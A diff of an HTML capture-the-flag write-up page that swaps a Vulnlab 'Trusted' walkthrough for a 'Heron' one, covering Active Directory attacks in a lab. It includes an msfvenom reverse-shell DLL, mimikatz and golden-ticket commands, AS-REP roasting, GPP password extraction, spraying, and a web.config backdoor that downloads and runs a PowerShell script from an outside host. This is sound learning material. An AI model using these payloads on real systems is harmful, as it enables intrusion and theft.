@@ -9,26 +9,24 @@
     <meta name="generator" content="Retype 3.6.0">
 
     <!-- Primary Meta Tags -->
-    <title>Trusted</title>
-    <meta name="title" content="Trusted">
-    <meta name="description" content="IPs: 10.10.217.117 10.10.217.118">
+    <title>Heron</title>
+    <meta name="title" content="Heron">
+    <meta name="description" content="IPs: 10.10.172.101 10.10.172.102">
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://eljayright.github.io/writeups/vulnlab/trusted/">
+    <link rel="canonical" href="https://eljayright.github.io/writeups/vulnlab/heron/">
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://eljayright.github.io/writeups/vulnlab/trusted/">
-    <meta property="og:title" content="Trusted">
-    <meta property="og:description" content="IPs: 10.10.217.117 10.10.217.118">
-    <meta property="og:image" content="https://eljayright.github.io/writeups/vulnlab/trusted/images/trusted.png">
+    <meta property="og:url" content="https://eljayright.github.io/writeups/vulnlab/heron/">
+    <meta property="og:title" content="Heron">
+    <meta property="og:description" content="IPs: 10.10.172.101 10.10.172.102">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://eljayright.github.io/writeups/vulnlab/trusted/">
-    <meta property="twitter:title" content="Trusted">
-    <meta property="twitter:description" content="IPs: 10.10.217.117 10.10.217.118">
-    <meta property="twitter:image" content="https://eljayright.github.io/writeups/vulnlab/trusted/images/trusted.png">
+    <meta property="twitter:url" content="https://eljayright.github.io/writeups/vulnlab/heron/">
+    <meta property="twitter:title" content="Heron">
+    <meta property="twitter:description" content="IPs: 10.10.172.101 10.10.172.102">
 
     <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
@@ -179,272 +177,281 @@
                                 <!-- Rendered if sidebar right is enabled -->
                                 <div id="docs-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
-<doc-anchor-target id="trusted" class="break-words">
+<doc-anchor-target id="heron" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#trusted">#</doc-anchor-trigger>
-        <span>Trusted</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#heron">#</doc-anchor-trigger>
+        <span>Heron</span>
     </h1>
 </doc-anchor-target>
 <p><figure class="content-center">
-    <img src="images/trusted.png" alt="">
+    <img src="heron.png" alt="">
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<p>IPs: <code v-pre>10.10.217.117</code> <code v-pre>10.10.217.118</code></p>
+<p>IPs: <code v-pre>10.10.172.101</code> <code v-pre>10.10.172.102</code></p>
 <doc-anchor-target id="recon">
     <h1>
         <doc-anchor-trigger class="header-anchor-trigger" to="#recon">#</doc-anchor-trigger>
         <span>Recon</span>
     </h1>
 </doc-anchor-target>
-<p>Nmap:
-10.10.217.117 trusteddc.trusted.vl</p>
+<p>This chain starts as an assumed breach with on ssh open on the 10.10.172.102 jump box.</p>
+<p>We are given the following credentials:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
-88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-03 10:27:29Z)
-135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
-139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
-389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
-445/tcp  open  microsoft-ds? syn-ack ttl 127
-464/tcp  open  kpasswd5?     syn-ack ttl 127
-593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
-636/tcp  open  tcpwrapped    syn-ack ttl 127
-3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
-3269/tcp open  tcpwrapped    syn-ack ttl 127
-3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
-5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</code></pre>
+<pre class="language-none"><code v-pre class="language-none">pentest:Heron123!</code></pre>
 </doc-codeblock></div>
-<p>10.10.217.118 labdc.lab.trusted.vl</p>
+<p>Going to set up a socks proxy over ssh when logging in, which should be useful later on.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
-80/tcp   open  http          syn-ack ttl 127 Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
-88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-03 10:27:18Z)
-135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
-139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
-389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
-443/tcp  open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
-445/tcp  open  microsoft-ds? syn-ack ttl 127
-464/tcp  open  kpasswd5?     syn-ack ttl 127
-593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
-636/tcp  open  tcpwrapped    syn-ack ttl 127
-3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
-3269/tcp open  tcpwrapped    syn-ack ttl 127
-3306/tcp open  mysql         syn-ack ttl 127 MariaDB 5.5.5-10.4.24
-3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
-5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</code></pre>
+<pre class="language-none"><code v-pre class="language-none">ssh -D 1080 pentest@10.10.172.102
+****************************************************
+*              Welcome to Heron Corp               *
+*  Unauthorized access to 'frajmp.heron.vl' is     *
+*  forbidden and will be prosecuted by law.        *
+****************************************************</code></pre>
 </doc-codeblock></div>
-<p>Seems to be a parent and child domain which will be interesting.</p>
-<p>Checking port 80 shows that xampp <code v-pre>XAMPP for Windows 8.1.6</code> is running, this has a webdav exploit <a href="https://github.com/ruthvikvegunta/XAMPP-WebDAV-Exploit">https://github.com/ruthvikvegunta/XAMPP-WebDAV-Exploit</a> but the endpoint doesn&#x27;t seem to exist.</p>
-<p>Fuzzing with <code v-pre>ffuf</code> shows a <code v-pre>/dev</code> endpoint:</p>
+<p>The ssh login gives us a host name also implying that the box is domain joined.</p>
+<p>Checking the home directory shows two domain users:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">ffuf -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://10.10.217.118/FUZZ
+<pre class="language-none"><code v-pre class="language-none">svc-web-accounting-d@heron.vl
+svc-web-accounting@heron.vl</code></pre>
+</doc-codeblock></div>
+<p>Also checking where the dc with nslookup:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">nslookup heron.vl
+Server:         10.10.172.101
+Address:        10.10.172.101#53
 
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
+Name:   heron.vl
+Address: 10.10.172.101</code></pre>
+</doc-codeblock></div>
+<p>With this we can check for some common ports on the domain controller.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">proxychains -q nmap -p 80,445,389,443 -sT heron.vl
+Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-05 17:27 AEST
+Nmap scan report for heron.vl (10.10.172.101)
+Host is up (0.29s latency).
 
-       v2.1.0
-________________________________________________
+PORT    STATE  SERVICE
+80/tcp  open   http
+389/tcp open   ldap
+443/tcp closed https
+445/tcp open   microsoft-ds
 
- :: Method           : GET
- :: URL              : http://10.10.217.118/FUZZ
- :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/common.txt
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
-________________________________________________
+Nmap done: 1 IP address (1 host up) scanned in 16.17 seconds</code></pre>
+</doc-codeblock></div>
+<p>Port 80:
+Looking at the website gives us a more usernames:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">wayne.wood
+julian.pratt
+samuel.davies</code></pre>
+</doc-codeblock></div>
+<p>As we still dont have domain credentials we could try to asreproast:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">proxychains -q GetNPUsers.py -no-pass -usersfile ~/vulnlab/heron/users.txt heron.vl/
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
-...snip...
-dev                     [Status: 301, Size: 336, Words: 22, Lines: 10, Duration: 283ms]</code></pre>
+[-] User svc-web-accounting-d doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User svc-web-accounting doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User wayne.wood doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User julian.pratt doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$samuel.davies@HERON.VL:6296a0c3d3aa9db106b143d143218911$121b1d70524cbeab629efa0ced00e364c47a8bcafc39492a8dd3ab3abcb6bdf28da22ccbab2664624a17955966fa7d2fcb189b4f63ff0459adf65dba7062db5032e9072328601e68939506a2f52e39bb09eb708851e53bec778e48eb71e467a0beba13581c5cfcfd858820a91f4d6b3d9d232d98bc6b58b22e4ad8393d836572f4f0fb177600eb9715a7cd15cb54852ce874096a493865921c90e87e4e71d349db45f2e31d8953d04092f3d85bebacb453fa3520caaa45e4329658fb9eafc60fa269e18440625c476e449cf76ebe70d1ad72c3f361dbafe4b25ac37fe4a54c9f0d85755e</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="foothold">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#foothold">#</doc-anchor-trigger>
-        <span>Foothold</span>
-    </h1>
-</doc-anchor-target>
-<p>On the main page there is a note:</p>
+<p>Cracking the hash with hashcat gives us domain creds!</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">Eric please take a look at this if you have the time. I tried to implement some php code and set up the database connection but it doesn't seem to work. Could you fix it please?</code></pre>
+<pre class="language-none"><code v-pre class="language-none">samuel.davies:l6fkiy9oN</code></pre>
 </doc-codeblock></div>
-<p>The URI path for the website also looks very interesting:</p>
+<p>Checking the shares shows that there is an <code v-pre>accounting$</code> share that could be interesting.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">https://10.10.217.118/dev/index.html?view=index.html</code></pre>
+<pre class="language-none"><code v-pre class="language-none">proxychains -q nxc smb heron.vl -u samuel.davies -p l6fkiy9oN --shares
+SMB         10.10.172.101   445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)
+SMB         10.10.172.101   445    MUCDC            [*] Enumerated shares
+SMB         10.10.172.101   445    MUCDC            Share           Permissions     Remark
+SMB         10.10.172.101   445    MUCDC            -----           -----------     ------
+SMB         10.10.172.101   445    MUCDC            accounting$                     
+SMB         10.10.172.101   445    MUCDC            ADMIN$                          Remote Admin
+SMB         10.10.172.101   445    MUCDC            C$                              Default share
+SMB         10.10.172.101   445    MUCDC            CertEnroll      READ            Active Directory Certificate Services share
+SMB         10.10.172.101   445    MUCDC            home$           READ            
+SMB         10.10.172.101   445    MUCDC            IPC$                            Remote IPC
+SMB         10.10.172.101   445    MUCDC            it$                             
+SMB         10.10.172.101   445    MUCDC            NETLOGON        READ            Logon server share 
+SMB         10.10.172.101   445    MUCDC            SYSVOL          READ            Logon server share 
+SMB         10.10.172.101   445    MUCDC            transfer$       READ,WRITE    </code></pre>
 </doc-codeblock></div>
-<p>Using this we are able to read arb files:</p>
+<p>Also gives the hostname of <code v-pre>MUCDC.heron.vl</code></p>
+<p>As we can read the SYSVOL going to see if there is a gpp password.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">https://10.10.217.118/dev/index.html?view=php://filter/convert.base64-encode/resource=C:\Windows\System32\drivers\etc\hosts
-
-IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=</code></pre>
-</doc-codeblock></div>
-<p>Fuzzing again shows a file called <code v-pre>db.php</code></p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u 'https://10.10.217.118/dev/index.html?view=php://filter/convert.base64-encode/resource=C:\xampp\htdocs\dev\FUZZ.php' -fw 55
-
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
-
-       v2.1.0
-________________________________________________
-
- :: Method           : GET
- :: URL              : https://10.10.217.118/dev/index.html?view=php://filter/convert.base64-encode/resource=C:\xampp\htdocs\dev\FUZZ.php
- :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
- :: Filter           : Response words: 55
-________________________________________________
-
-db                      [Status: 200, Size: 1109, Words: 25, Lines: 31, Duration: 286ms]</code></pre>
-</doc-codeblock></div>
-<p>Which has db creds:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">&lt;?php 
-$servername = &quot;localhost&quot;;
-$username = &quot;root&quot;;
-$password = &quot;SuperSecureMySQLPassw0rd1337.&quot;;
-
-$conn = mysqli_connect($servername, $username, $password);
-
-if (!$conn) {
-  die(&quot;Connection failed: &quot; . mysqli_connect_error());
-}
-echo &quot;Connected successfully&quot;;</code></pre>
-</doc-codeblock></div>
-<p>Logging into the db gives creds!</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">+--------------+----------------------------------+
-| short_handle | password                         |
-+--------------+----------------------------------+
-| rsmith       | 7e7abb54bbef42f0fbfa3007b368def7 |
-| ewalters     | d6e81aeb4df9325b502a02f11043e0ad |
-| cpowers      | e3d3eb0f46fe5d75eed8d11d54045a60 |
-+--------------+----------------------------------+</code></pre>
-</doc-codeblock></div>
-<p>Throwing these in hashcat gives:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">rsmith:IHateEric2</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="lateral-movement-to-ewalters">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#lateral-movement-to-ewalters">#</doc-anchor-trigger>
-        <span>Lateral movement to ewalters</span>
-    </h1>
-</doc-anchor-target>
-<p>Looking at shares, there isnt anything interesting we can read, so going to run bloodhound.</p>
-<p>Bloodhound shows that our user can forcechange the password of ewalters. So lets do that.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">rpcclient -U 'rsmith' //labdc.lab.trusted.vl
-Can't load /etc/samba/smb.conf - run testparm to debug it
-Password for [WORKGROUP\rsmith]:
-rpcclient $&gt; setuserinfo2 ewalters 23 SecurePassword123@
-</code></pre>
-</doc-codeblock></div>
-<p>Then checking that it is set.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">nxc winrm labdc.lab.trusted.vl -u ewalters -p SecurePassword123@
-WINRM       10.10.217.118   5985   LABDC            [*] Windows Server 2022 Build 20348 (name:LABDC) (domain:lab.trusted.vl)
-WINRM       10.10.217.118   5985   LABDC            [+] lab.trusted.vl\ewalters:SecurePassword123@ (Pwn3d!)</code></pre>
-</doc-codeblock></div>
-<p>Nice! We can also login with winrm</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">evil-winrm -i labdc.lab.trusted.vl -u ewalters -p SecurePassword123@
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\ewalters\Documents&gt; </code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="dll-hijack-to-da">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#dll-hijack-to-da">#</doc-anchor-trigger>
-        <span>DLL Hijack to DA</span>
-    </h1>
-</doc-anchor-target>
-<p>Looking around there is an AVTest directory with two files:
-<code v-pre>kasperskyremovaltool.exe</code> and <code v-pre>readme.txt</code></p>
-<p>The note mentions another user is expected to run this program:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">Since none of the AV Tools we tried here in the lab satisfied our needs it's time to clean them up.
-I asked Christine to run them a few times, just to be sure.
-
-Let's just hope we don't have to set this lab up again because of this.</code></pre>
-</doc-codeblock></div>
-<p>A potential privesc would be to see if we can dll hijack this application and get a reverse shell as the user running the application which should be an admin as AVTools love there high privs. :)</p>
-<p>To check for this you can load up procmon and check for missing imports, there are heaps of resources on how to do this.</p>
-<p><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking</a></p>
-<p>Do this you will see that the application tries to load <code v-pre>KasperskyRemovalToolENU.dll</code> a few times.
-So if we make a dll and call it <code v-pre>KasperskyRemovalToolENU.dll</code> and place it in the same location as the <code v-pre>kasperskyremovaltool.exe</code> we will get a shell.</p>
-<p>Being lazy and using msfvenom:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">msfvenom -p windows/shell_reverse_tcp LHOST=10.8.0.110 LPORT=9001 -f dll -o KasperskyRemovalToolENU.dll</code></pre>
-</doc-codeblock></div>
-<p>Uploading the file and waiting a bit we get a shell as <code v-pre>cpowers</code> that happens to be a domain admin on the machine.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">whoami /groups
-
-GROUP INFORMATION
------------------
+<pre class="language-none"><code v-pre class="language-none">proxychains -q nxc smb heron.vl -u samuel.davies -p l6fkiy9oN -M gpp_password
 ... snip ...
-BUILTIN\Administrators                     Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
-LAB\Domain Admins                          Group            S-1-5-21-2241985869-2159962460-1278545866-512 Mandatory group, Enabled by default, Enabled group             
-Mandatory Label\High Mandatory Level       Label            S-1-16-12288</code></pre>
+PP_PASS... 10.10.172.101       445    MUCDC            [+] Found credentials in heron.vl/Policies/{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}/Machine/Preferences/Groups/Groups.xml
+GPP_PASS... 10.10.172.101       445    MUCDC            Password: H3r0n2024#!
+GPP_PASS... 10.10.172.101       445    MUCDC            action: U
+GPP_PASS... 10.10.172.101       445    MUCDC            newName: _local
+GPP_PASS... 10.10.172.101       445    MUCDC            fullName: 
+GPP_PASS... 10.10.172.101       445    MUCDC            description: local administrator
+GPP_PASS... 10.10.172.101       445    MUCDC            changeLogon: 0
+GPP_PASS... 10.10.172.101       445    MUCDC            noChange: 0
+GPP_PASS... 10.10.172.101       445    MUCDC            neverExpires: 1
+GPP_PASS... 10.10.172.101       445    MUCDC            acctDisabled: 0
+GPP_PASS... 10.10.172.101       445    MUCDC            subAuthority: RID_ADMIN
+GPP_PASS... 10.10.172.101       445    MUCDC            userName: Administrator (built-in)</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="forest-privesc">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#forest-privesc">#</doc-anchor-trigger>
-        <span>Forest Privesc</span>
-    </h1>
-</doc-anchor-target>
-<p>Going back to bloodhound shows that there is a parent domain called <code v-pre>trusted.vl</code> to priv esc into this domain and get enterprise admin we can grab the krbtgt hash for <code v-pre>lab.trusted.vl</code> and forge a golden ticket.
-To get this we can just do a dcsync on the dc with mimikatz.</p>
+<p>Going to password spray to see if this password has been reused as it looks like a generic domain password.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">.\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /user:krbtgt /patch&quot; &quot;exit&quot;
-..snip..
-User : krbtgt
-LM   : 
-NTLM : c7a03c565c68c6fac5f8913fab576ebd</code></pre>
+<pre class="language-none"><code v-pre class="language-none">proxychains -q nxc ldap heron.vl -u ~/vulnlab/heron/users.txt -p 'H3r0n2024#!'
+SMB         10.10.172.101       445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)
+LDAP        10.10.172.101       389    MUCDC            [+] heron.vl\svc-web-accounting-d:H3r0n2024#!</code></pre>
 </doc-codeblock></div>
-<p>We also need the domain sid of both domains, both available from bloodhound.</p>
+<p>Checking shares again with this user shows that we can read and write to <code v-pre>accounting$</code></p>
+<p>In the share there is a <code v-pre>web.config</code> file. This can be used to backdoor the application and gain RCE in the context of the IIS server. This is a good post if you want more information: <a href="https://soroush.me/blog/2019/08/uploading-web-config-for-fun-and-profit-2/">https://soroush.me/blog/2019/08/uploading-web-config-for-fun-and-profit-2/</a></p>
+<p>As there is no need to do any fancy opsec stuff, I&#x27;m just going to <code v-pre>iex</code> a powershell revtcp oneliner. (not adding shell.ps1 as it triggers chromes AV scanner :|)</p>
+<p>The new <code v-pre>web.config</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">lab.trusted.vl S-1-5-21-2241985869-2159962460-1278545866
-trusted.vl S-1-5-21-3576695518-347000760-3731839591</code></pre>
+<pre class="language-none"><code v-pre class="language-none">cat web.config
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;configuration&gt;
+  &lt;location path=&quot;.&quot; inheritInChildApplications=&quot;false&quot;&gt;
+    &lt;system.webServer&gt;
+      &lt;handlers&gt;
+        &lt;add name=&quot;aspNetCore&quot; path=&quot;shell.me&quot; verb=&quot;*&quot; modules=&quot;AspNetCoreModuleV2&quot; resourceType=&quot;Unspecified&quot; /&gt;
+      &lt;/handlers&gt;
+          &lt;aspNetCore processPath=&quot;cmd.exe&quot; arguments=&quot;/c powershell.exe iex(New-Object Net.WebClient).downloadString('http://IP:8080/shell.ps1')&quot;/&gt;
+    &lt;/system.webServer&gt;
+  &lt;/location&gt;
+&lt;/configuration&gt;
+&lt;!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4--&gt;</code></pre>
 </doc-codeblock></div>
-<p>We can use the default Enterprise Admin groups SID being &lt;domain_sid&gt;-519</p>
-<p>Now to form the ticket:</p>
+<p>So going to the path <code v-pre>gimmieshell.pls</code> should give us a rev shell back. The annoying thing is going to be doing this all via the socks proxy, as the webapp wont be able to talk directly to our box.</p>
+<p>What we can do is open up 2 reverse port forwards from the jump box to us. One for the payload download, and the other for a shell.</p>
+<p>At this stage I tried a few different ways to forward a port so I dont have to use the jump box to stage and catch a shell but nothing seemed to work.</p>
+<p>As im still not sure what website this controls im going to quickly fuzz for vhosts:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">ticketer.py -nthash c7a03c565c68c6fac5f8913fab576ebd -domain-sid S-1-5-21-2241985869-2159962460-1278545866 -extra-sid S-1-5-21-3576695518-347000760-3731839591-519 -domain lab.trusted.vl Administrator</code></pre>
-</doc-codeblock></div>
-<p>Then login with psexec:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Windows\system32&gt; whoami
-nt authority\system
+<pre class="language-none"><code v-pre class="language-none">ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://heron.vl -H &quot;Host: FUZZ.heron.vl&quot; -x socks5://127.0.0.1:1080 -fw 1230
 
-C:\Windows\system32&gt; hostname
-trusteddc</code></pre>
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://heron.vl
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.heron.vl
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Proxy            : socks5://127.0.0.1:1080
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 1230
+________________________________________________
+
+accounting              [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 4036ms]</code></pre>
 </doc-codeblock></div>
-<p>:D !</p>
+<p>Uploading the new web.config and using python3 and nc on the jump box to stage and catch the reverse shell.</p>
+<p>Then going to <code v-pre>http://accounting.heron.vl/shell.me</code> to trigger the payload.</p>
+<p>This worked!! Now we are:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">PS C:\webaccounting&gt; whoami
+heron\svc-web-accounting</code></pre>
+</doc-codeblock></div>
+<p>The shell is super unstable but that doesnt matter as looking shows there is a file with ssh creds!</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">PS C:\windows\scripts&gt; type ssh.ps1
+$plinkPath = &quot;C:\Program Files\PuTTY\plink.exe&quot;
+$targetMachine = &quot;frajmp&quot;
+$user = &quot;_local&quot;
+$password = &quot;Deplete5DenialDealt&quot;
+&amp; &quot;$plinkPath&quot; -ssh -batch $user@$targetMachine -pw $password &quot;ps auxf; ls -lah /home; exit&quot;</code></pre>
+</doc-codeblock></div>
+<p>This user is also in the sudo group and can run ALL ALL as root.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">_local@frajmp:~$ id
+uid=1000(_local) gid=1000(_local) groups=1000(_local),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
+_local@frajmp:~$ sudo -l 
+Matching Defaults entries for _local on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User _local may run the following commands on localhost:
+    (ALL : ALL) ALL</code></pre>
+</doc-codeblock></div>
+<p>Going to password spray again to see if there is password reuse.</p>
